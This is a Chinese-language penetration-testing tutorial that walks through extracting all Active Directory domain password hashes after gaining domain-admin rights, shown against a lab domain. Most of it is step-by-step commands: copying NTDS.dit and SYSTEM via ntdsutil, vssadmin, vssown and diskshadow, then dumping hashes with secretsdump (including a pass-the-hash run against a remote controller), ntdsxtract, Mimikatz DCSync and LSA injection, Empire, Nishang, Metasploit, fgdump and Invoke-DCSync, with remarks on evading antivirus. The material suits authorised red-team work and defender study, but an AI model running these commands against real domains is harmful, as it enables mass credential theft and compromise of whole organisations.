
## 域内用户Hash获取方式总结

- - -

#### [文章前言](#toc_)

在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见的一个操作，这些哈希值存储在域控制器(NTDS.DIT)中的数据库文件中，并带有一些其他信息，如用户名、散列值、组、GPP、OU等于活动目录相关的信息，它和SAM文件一样都是被操作系统锁定的，因此无法直接复制到其他位置以提取信息。NTDS.dit文件位于Windows以下位置：

`C:\Windows\NTDS\NTDS.dit`

[![image.png](assets/1698894155-5be2fd5e8609e9d76887f5561117f107.png)](https://storage.tttang.com/media/attachment/2022/09/30/41c72010-4028-4a92-9525-881d61844382.png)

#### [NTDS提取](#toc_ntds)

##### [NTDSUTIL](#toc_ntdsutil)

NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理Windows Active Directory数据库，但是，渗透测试人员和redteam可以用它来拍摄现有ntds.dit文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取

ntdsutil  
activate instance ntds  
ifm  
create full C:\\ntdsutil  
quit  
quit

[![image.png](assets/1698894155-682e83620a36559762eccb3afadf8347.png)](https://storage.tttang.com/media/attachment/2022/09/30/82a4dba7-0d84-4841-9be0-cde28f2e9357.png)

之后在C:\\ntdsutil中将生成两个新文件夹：Active Directory和Registry：

[![image.png](assets/1698894155-845be4f43855de11320439afcebef38b.png)](https://storage.tttang.com/media/attachment/2022/09/30/5bfcecc9-3a09-47cd-aa3e-6355a55b8947.png)

NTDS.DIT文件将保存在Active Directory中：  
[![image.png](assets/1698894155-60f63e5b4ce9f6dca5081e502ed54ba8.png)](https://storage.tttang.com/media/attachment/2022/09/30/f616c782-b94a-4f6c-95ad-46d514a488e6.png)

SAM和SYSTEM文件将保存到Registry文件夹中：

[![image.png](assets/1698894155-91d9de15ba631d4075bca6563180b69b.png)](https://storage.tttang.com/media/attachment/2022/09/30/b75d2f8c-49a2-4823-8e3d-783176a3ec37.png)

之后可以使用ntdsdump进行离线提取Hash:

ntdsdump.exe -f ntds.dit -s SYSTEM

# [参数说明：](#toc__1)

ntdsdump.exe <-f ntds.dit> <-k HEX-SYS-KEY | -s system.hiv> \[-o out.txt\] \[-h\] \[-t JOHN|LC\] \* -f ntds.dit路径 \* -k 可选的十六进制格式的SYSKEY \* -s 可选的system.hiv路径 \* -h 导出历史密码记录 \* -t 导出格式，LC或JOHN \* -o 导出到指定文件中 \*  
[![image.png](assets/1698894155-518840b77b481cc2da8a539594941ba7.png)](https://storage.tttang.com/media/attachment/2022/09/30/900d1192-49d5-4d09-ba40-f7998a7f88aa.png)

之后在CMd5解密网站进行解密解密即可：[https://www.cmd5.org/](https://www.cmd5.org/)

[![image.png](assets/1698894155-ac2b690e289c9ecb68271bd1c09a82bb.png)](https://storage.tttang.com/media/attachment/2022/09/30/af0f3da4-5987-4816-bd60-796b85826d38.png)

##### [vssadmin](#toc_vssadmin)

vssadmin是WIndows Server 2008和Win 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息(只能管理系统Provider创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序等，在内网渗透测试过程中，我们也可以使用vssadminn来提取ntds.dit文件，流程如下：

Step 1：在域控制器中打开命令环境，输入如下命令，创建一个C盘的影卷拷贝：

vssadmin create shadow /for=c:

[![image.png](assets/1698894155-4c4a472d0bc5f51d96e548a82f99bbf2.png)](https://storage.tttang.com/media/attachment/2022/09/30/ba5722b4-2d20-4097-b366-05d576cc3128.png)

Step 2:将NTDS.dit和SYSTEM文件从创建的影卷中复制出来

copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\NTDS\\ntds.dit c:\\ntds.dit  
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\SYSTEM

[![image.png](assets/1698894155-3caa500f7def12a2313d1a12fad7cd05.png)](https://storage.tttang.com/media/attachment/2022/09/30/af5d9964-0460-4ab6-bf34-fdd6a76e2e38.png)

之后可以在C盘中看到成功复制ntds.dit文件：

[![image.png](assets/1698894155-551699db690891d7745b2672c55c2320.png)](https://storage.tttang.com/media/attachment/2022/09/30/b964f2ce-1a84-46d1-b028-8a026dafe04f.png)

Step 3：之后执行以下命令删除影卷信息：

`vssadmin delete shadows /for=c: /quiet`

[![image.png](assets/1698894155-6520f9898b6ff3555cc61ecd41b9ec95.png)](https://storage.tttang.com/media/attachment/2022/09/30/ab5474fa-1563-4d6a-88ae-f9201075ac91.png)

Step 4：之后通过impacket来导出hash值

./secretsdump.py -system /root/vssadmin/SYSTEM -ntds /root/vssadmin/ntds.dit LOCAL

[![image.png](assets/1698894155-e6743c38c0a67ce8c6009f378c380379.png)](https://storage.tttang.com/media/attachment/2022/09/30/09bb6e6b-e43a-46c1-a1e6-ef2f380bf7a8.png)

##### [vssown.vbs](#toc_vssownvbs)

与vssadmin程序类似，Tim Tomes开发了vssown([https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs) )，它是一个可视化的基本脚本，可以创建和删除卷影副本，从卸载的卷影副本运行任意可执行文件，以及启动和停止卷影复制服务。

Step 1:启动影卷拷贝服务

cscript vssown.vbs /start

[![image.png](assets/1698894155-d86aebaa19b269925737285ec035292d.png)](https://storage.tttang.com/media/attachment/2022/09/30/a214f087-17a0-4d76-874e-f5338b1849d1.png)

Step 2：创建一个C盘的影卷拷贝

cscript vssown.vbs /create c

[![image.png](assets/1698894155-1f2cf508f07a026dea1c6c175c911df2.png)](https://storage.tttang.com/media/attachment/2022/09/30/071b4cff-f909-4824-b8c9-954c1d776a0b.png)

Step 3:列出当前影卷拷贝  
cscript vssown.vbs /list

[![image.png](assets/1698894155-beeba1c1959e3e490653042cde947d5e.png)](https://storage.tttang.com/media/attachment/2022/09/30/7dfbb6a0-6338-4717-8074-d379961ccdcc.png)

Step 4：复制ntds.dit、SYSTEM、SAM文件

copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit C:\\vssown\\ntds.dit  
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\system32\\config\\SYSTEM C:\\vssown\\SYSTEM  
copy \\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\system32\\config\\SAM C:\\vssown\\SAM

[![image.png](assets/1698894155-7d49a71fcc350292ee7f592b02cb1723.png)](https://storage.tttang.com/media/attachment/2022/09/30/b972905e-4a15-4c17-838e-0780270cfd11.png)

Step 5:查看拷贝的文件

`dir c:\vssown\`

[![image.png](assets/1698894155-862d41e9e9369fca70a085b5340841a0.png)](https://storage.tttang.com/media/attachment/2022/09/30/8e94a71c-cdd4-4a19-b26a-7409855f7f8b.png)

Step 6：删除影卷拷贝

cscript vssown.vbs /delete {54ECD66A-570C-4489-956F-9B83E4C8B1B9}

[![image.png](assets/1698894155-29c3437681d8ee512b1e83e3e9d7209b.png)](https://storage.tttang.com/media/attachment/2022/09/30/5abe25ed-4b4c-4a75-b4c7-2f99a40d71c4.png)

Step 7：之后使用impacket导出Hash

./secretsdump.py -system /root/vssown/SYSTEM -ntds /root/vssown/ntds.dit LOCAL

[![image.png](assets/1698894155-c7c518db40f45c97e9f907a26102e0a1.png)](https://storage.tttang.com/media/attachment/2022/09/30/da8cfd94-491b-4633-b327-9392a2c535f8.png)

##### [diskshadow](#toc_diskshadow)

DiskShadow是Microsoft签名的二进制文件，用于协助管理员执行与卷复制服务（VSS）相关的操作。最初bohops在他的博客中写到了这个二进制文件。这个二进制文件有两个交互式和脚本模式，因此可以使用一个脚本文件，它将包含自动执行NTDS.DIT提取过程所需的所有命令。脚本文件可以包含以下行，以便创建新的卷影副本，装入新驱动器，执行复制命令并删除卷影副本，在使用时需要注意一点，DiskShadow二进制文件需要从C\\Windows\\System32路径执行，如果从另一个路径调用它，脚本将无法正确执行：

set context persistent nowriters  
add volume c: alias someAlias  
create  
expose %someAlias% z:  
exec "cmd.exe" /c copy z:\\windows\\ntds\\ntds.dit c:\\ntds.dit  
delete shadows all  
reset

在cmd下执行以下命令：

diskshadow.exe /s c:\\diskshadow.txt

[![image.png](assets/1698894155-a920de18ab1c3210a9b1926e7ec3a969.png)](https://storage.tttang.com/media/attachment/2022/09/30/f2c9cea8-cfa3-4502-9599-afe3014aba34.png)

之后查看c盘可以看到成功复制文件：

[![image.png](assets/1698894155-4d65df1662ac19ba0238f80d593561af.png)](https://storage.tttang.com/media/attachment/2022/09/30/c2700598-1ac6-4a89-85c0-3242d67415a8.png)

导出ntds.dit后，可以键system.hive转储，因为system.hive中存放着ntds.dit的秘钥，如果没有该密钥，将无法查看ntds.dit中的信息：

reg save hklm\\system c:\\system.hive

[![image.png](assets/1698894155-dd7279546074ae4997a92f31763ea2db.png)](https://storage.tttang.com/media/attachment/2022/09/30/888198f2-7554-4520-9a7e-7bb8cfe86ce6.png)

之后使用impacket导出hash

./secretsdump.py -system /root/diskshadow/system.hive -ntds /root/diskshadow/ntds.dit LOCAL

[![image.png](assets/1698894155-f4d3c4dbda9c51eff6e1946defa5258f.png)](https://storage.tttang.com/media/attachment/2022/09/30/afcd9f3c-45c9-4690-ab47-8be44306e9b0.png)

#### [NDTS Hash](#toc_ndts-hash)

##### [Impacket](#toc_impacket)

我们可以使用impacket工具包中的secretsdump来解析ntds.dit文件并导出散列：

`./secretsdump.py -system /root/system.hive -ntds /root/ntds.dit LOCAL`

[![image.png](assets/1698894155-b70702c42a190d6f2b5fd9027559b500.png)](https://storage.tttang.com/media/attachment/2022/09/30/4f2d314a-f515-4e32-ad20-48804d3f3c3c.png)

impacket还可以直接通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域散列值：

`./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:41945356c1b2adde08c00d0e48515b7e -just-dc hacke.testlab/administrator@192.168.188.2`

[![image.png](assets/1698894155-34149bce3f4cdfd25a898c6da0b3b782.png)](https://storage.tttang.com/media/attachment/2022/09/30/894f88f1-e898-4bfa-a0bb-e868663e8d98.png)

##### [esedbexport](#toc_esedbexport)

在这里我们需要通过安装libesedb从ntds.dit中导出dataable和link\_table，在终端执行以下命令下载libesedb：

git clone [https://github.com/libyal/libesedb](https://github.com/libyal/libesedb)  
cd libesedb/  
./synclibs.sh  
./autogen.sh

[![image.png](assets/1698894155-682c9a23f5fe893ed366946749412840.png)](https://storage.tttang.com/media/attachment/2022/09/30/d69917de-9a55-4d47-aea2-3cf57ce77a4c.png)

[![image.png](assets/1698894155-915af3d33fe517f01a91677cf52f23ce.png)](https://storage.tttang.com/media/attachment/2022/09/30/7b862b74-f349-41b6-9640-1634360b9838.png)

[![image.png](assets/1698894155-04ddce1a1efd6799fc7d13d5b0615461.png)](https://storage.tttang.com/media/attachment/2022/09/30/d737bef7-4ff4-4e48-9cb3-19fd0ba5545a.png)

之后执行以下命令安装依赖：

sudo apt install git autoconf automake autopoint libtool pkg-config

[![image.png](assets/1698894155-9fcc5f782c71817e3e37267ceb22276b.png)](https://storage.tttang.com/media/attachment/2022/09/30/23371c35-2add-4ac7-be32-83d59017000e.png)

之后执行以下命令对libesedb进行编译与安装：

./configure  
make  
sudo make install  
sudo ldconfig

[![image.png](assets/1698894155-5a7d933438d3f7a6bb1e057f5ad2ec9b.png)](https://storage.tttang.com/media/attachment/2022/09/30/fc29e706-1dfb-4e3a-8c64-fc0b990c4441.png)

安装完成之后会在系统的/usr/local/bin目录下看的esedbexport程序，如下所示：

ls /usr/local/bin/ | grep esedbexport

[![image.png](assets/1698894155-999b25aaccdca680b2c24462803fda7f.png)](https://storage.tttang.com/media/attachment/2022/09/30/207a221e-3cbb-4c73-8318-e2d77f60656e.png)

之后使用esedbexport进行恢复操作，执行以下命令来提取表信息，操作时间视ntds.dit文件的大小而定，如果提取成功会在同一目录下生成一个文件夹，这里我们只提取dataable和link\_table:

esedbexport -m tables /root/ntds.dit

[![image.png](assets/1698894155-e68f6a726b64d30e1ef2af65e48b4aa5.png)](https://storage.tttang.com/media/attachment/2022/09/30/4d16e06e-612f-4781-9f22-cc24aa727882.png)

导出信息如下所示：

[![image.png](assets/1698894155-d5deb4b0b47af4c2a7320853ab0562fc.png)](https://storage.tttang.com/media/attachment/2022/09/30/c749791e-43a6-4c99-bef1-ea5a94bcc9d3.png)

之后我们借助ntdsxtract来导出散列值，首先我们需要安装该工具：

git clone [https://github.com/csababarta/ntdsxtract.git](https://github.com/csababarta/ntdsxtract.git)

[![image.png](assets/1698894155-417bd2b2d215014e33c4ed0fc329ae68.png)](https://storage.tttang.com/media/attachment/2022/09/30/2f0b99ff-5657-449a-9c52-c9744eee4901.png)

之后进入文件夹执行以下命令进行安装：

python setup.py build && python setup.py install  
running build

[![image.png](assets/1698894155-c9e5f6928535999888b35588b5d24b6f.png)](https://storage.tttang.com/media/attachment/2022/09/30/55dc2acc-f701-4178-800b-f4cd5832dffa.png)

之后输入以下命令，将导出的ntds.dit.export文件夹和SYSTEM文件一并放入ntdsxtract文件夹并执行以下命令：

./dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link\_table.7 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all\_user.txt

[![image.png](assets/1698894155-daae7cb2ed09521e0fb0bad6419dfa00.png)](https://storage.tttang.com/media/attachment/2022/09/30/e164ee44-ebdb-4489-928b-572d07c685e9.png)

之后会将域内的所有用户名和散列值导出到all\_user.txt中：

[![image.png](assets/1698894155-347b05c1a67ca16ddb8cefa8ea4d5a8a.png)](https://storage.tttang.com/media/attachment/2022/09/30/c69a6dca-54f5-4a45-ad17-c721561fa422.png)

ntds.dit包含域内的所有信息，可以通过分析ntds.dit导出域内的计算机信息以及其他信息，命令如下：

dscomputers.py ntds.dit.export/datatable.4 computer\_output --csvoutfile all\_computers.csv

[![image.png](assets/1698894155-9dab5377826f1943bacb6a4b6229cb32.png)](https://storage.tttang.com/media/attachment/2022/09/30/a1e78965-5c42-4f5c-b41d-5e9e3776dd1a.png)

[![image.png](assets/1698894155-a7a649a036e82e0f8da2b03b93cf606c.png)](https://storage.tttang.com/media/attachment/2022/09/30/4f3bdd73-15d1-4baf-8135-740f118b873c.png)

#### [NTDSDumpex](#toc_ntdsdumpex)

NTDSDumpex.exe([https://github.com/zcgonvh/NTDSDumpEx/releases](https://github.com/zcgonvh/NTDSDumpEx/releases) )程序也可以用于导出散列值得操作，在使用时只需要将ntds.dit、SYSTEM、NTDSDumpex.exe放到同一目录下，之后执行以下命令即可(效果并不理想，时常出现下面的问题)：

NTDSDumpex.exe -d ntds.dit -s system

[![image.png](assets/1698894155-4208c62de84f8b4907654183250fdb6c.png)](https://storage.tttang.com/media/attachment/2022/09/30/3610d5b3-1f9c-4b87-b536-16b583c782fc.png)

#### [第三方工具](#toc__2)

下面介绍几种常见的域内用户Hash获取的方法与策略~

##### [Mimikatz](#toc_mimikatz)

项目地址：[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

项目介绍：mimikatz用于从Windows操作系统内存中提取明文密码、散列、pin码和kerberos票据，同时mimikatz还可以执行传递散列、传递票证或构建黄金票证。  
工具使用：

a、获取所有域内用户的账户信息

lsadump::dcsync /domain:hacke.testlab /all /csv

[![image.png](assets/1698894155-4f90a6e5b827dcd76bfa454a8c142fe6.png)](https://storage.tttang.com/media/attachment/2022/09/30/99540f31-cf28-4732-9217-817b93184a2f.png)

b、通过使用/user参数指定域用户名来获取特定用户的所有帐户信息，包括其密码哈希

lsadump::dcsync /domain:hacke.testlab /user:testuser

[![image.png](assets/1698894155-6f1f7ef271e8e951481fa132876c135b.png)](https://storage.tttang.com/media/attachment/2022/09/30/519684b5-a4ce-4e51-9519-1bd1fcdfd11f.png)

[![image.png](assets/1698894155-5a936c7dbccfa6d374517067e1c99d3f.png)](https://storage.tttang.com/media/attachment/2022/09/30/f233eb91-7777-46bd-bbd3-3db67a8effca.png)

c、直接在域控制器中执行Mimikatz，通过lsass.exe进程dump哈希

privilege::debug  
lsadump::lsa /inject  
[![image.png](assets/1698894155-c105edd3c2da20e2733f6066ea4ca670.png)](https://storage.tttang.com/media/attachment/2022/09/30/74f743c7-aba1-4fae-91bd-6793d313d083.png)

##### [Empire](#toc_empire)

提取域内所有用户hash值：

usemodule credentials/mimikatz/dcsync\_hashdump

[![image.png](assets/1698894155-ffe164769bdc0eadf9a4ab5ac604b30b.png)](https://storage.tttang.com/media/attachment/2022/09/30/4008506e-022d-406c-932b-af6a7da473f3.png)

dump特定帐户信息：

(Empire: 8GLZTYXR) > usemodule credentials/mimikatz/dcsync  
(Empire: powershell/credentials/mimikatz/dcsync) > set user Al1ex  
(Empire: powershell/credentials/mimikatz/dcsync) > execute

[![image.png](assets/1698894155-0edcc4e7d30f8d2115a25aa023b2dfc8.png)](https://storage.tttang.com/media/attachment/2022/09/30/8a3f7b44-7d5a-4787-9805-5d191f9464bc.png)

##### [Nishang](#toc_nishang)

Nishang是一个PowerShell框架，它让redteam和渗透测试人员能够对系统进行攻击性操作，Nishang中的VSS脚本可以用于自动提取所需的文件：NTDS.DIT，SAM和SYSTEM，这些文件将被解压缩到当前工作目录或指定的任何其他文件夹中。

Import-Module .\\Copy-VSS.ps1  
Copy-VSS //复制到当前目录  
Copy-VSS -DestinationDir C:\\ShadowCopy //复制到指定目录

[![image.png](assets/1698894155-c1547a590d3b9d46910800290c07e659.png)](https://storage.tttang.com/media/attachment/2022/09/30/24db06ba-d311-4922-b8df-5ee930539153.png)

之后通过Mimikatz来获取信息：

lsadump::sam /sam:sam.hive /system:system.hive

[![image.png](assets/1698894155-0c5261cc016d2ac58f9e390b4b9e5073.png)](https://storage.tttang.com/media/attachment/2022/09/30/bb56f00c-3624-411c-b052-4d720b179290.png)

##### [Metasploit](#toc_metasploit)

run post/windows/gather/hashdump

[![image.png](assets/1698894155-d45b99576f88628b2169dc75bf66cb6a.png)](https://storage.tttang.com/media/attachment/2022/09/30/2f5e937b-7781-4c04-8a34-479aa6e7ff55.png)

run post/windows/gather/smart\_hashdump

[![image.png](assets/1698894155-8ab5415a2e53311bd9f560214d14a9ca.png)](https://storage.tttang.com/media/attachment/2022/09/30/b6fdbcde-b3ec-451a-9964-4deb33b8073d.png)

如果已经拿到域控制器的现有Meterpreter会话，则可以使用命令hashdump，但是，此方法不被认为是安全的，因为可能会使域控崩掉

[![image.png](assets/1698894155-0ea3700e59b5ffe1b9de00c942271cd2.png)](https://storage.tttang.com/media/attachment/2022/09/30/5524af71-7df8-447f-a195-fa74b8ca2fea.png)

##### [fgdump](#toc_fgdump)

fgdump([http://www.foofus.net/fizzgig/fgdump/fgdump-2.1.0-exeonly.zip](http://www.foofus.net/fizzgig/fgdump/fgdump-2.1.0-exeonly.zip) )是一个比较老的可执行文件，可提取的LanMan和NTLM的密码哈希值，如果已获取本地管理员凭据，则可以在本地或远程执行。在执行期间，fgdump将尝试禁用可能在系统上运行的防病毒软件，如果成功，则会将所有数据写入两个文件中，如果存在防病毒或端点解决方案，则不应该将fgdump用作dump密码哈希的方法以避免检测，因为大多数防病毒公司(包括Microsoft的Windows Defender)都会对将它kill掉

fgdump.exe

[![image.png](assets/1698894155-efc4caebfb2fc1db7de930d966e4a666.png)](https://storage.tttang.com/media/attachment/2022/09/30/7d8e3e22-39d3-4572-b394-38eec0021e57.png)

之后可以通过检查.pwdump文件的内容来get密码哈希值

[![image.png](assets/1698894155-0412cd3de5bd06534b01625c6c46b2c2.png)](https://storage.tttang.com/media/attachment/2022/09/30/77e36c95-c5f0-415d-a03c-b59056b61167.png)

PS:速度超级慢，慢的卡死，强烈不推荐~

##### [Invoke-DCSync](#toc_invoke-dcsync)

Invoke–DCSync([https://gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)) 是Nick Landers利用PowerView开发的powershell脚本，Invoke-ReflectivePEInjection和PowerKatz的DLL wrapper调用Mimikatz的DCSync方法检索哈希值，直接执行该函数将生成以下输出：

Import-Module ./Invoke-DCSync.ps1  
Invoke-DCSync

[![image.png](assets/1698894155-0082d81d50c0f648ff4057fb503d5a5e.png)](https://storage.tttang.com/media/attachment/2022/09/30/09c632e4-2394-463e-aeb5-8e8b2834db94.png)

从上面可以看到结果将格式化为四个表：Domain，User，RID和Hash，当使用参数-PWDumpFormat执行Invoke-DCSync将以以下格式检索哈希：

user：id：lm：ntlm :::

[![image.png](assets/1698894155-ece50ed8915d01b9a6d5d8dce87ff78d.png)](https://storage.tttang.com/media/attachment/2022/09/30/d16fd4c6-476d-4f76-856e-10521faea523.png)

#### [文末小结](#toc__3)

本篇文章主要介绍了域内用户Hash的获取方法，同样在内网渗透中很有用，后续有机会再给大家分享其他的内网内容
